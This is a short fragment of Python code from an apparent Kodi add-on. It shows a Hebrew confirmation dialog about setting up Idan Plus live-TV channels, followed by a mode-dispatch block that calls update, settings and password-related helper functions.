    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6958
    if choice ==1 :#line:6959
        iptvidanplus ()#line:6960
    else :#line:6962
     sys .exit ()#line:6963
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6965
elif mode =='adv_settings':buffer1 ()#line:6966
elif mode =='getpass':getpass ()#line:6967
elif mode =='setpass':setpass ()#line:6968
elif mode =='setuname':setuname ()#line:6969
elif mode =='passandUsername':passandUsername ()#line:6970
elif mode =='9':disply_hwr ()#line:6971
elif mode =='99':disply_hwr2 ()#line:6972
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))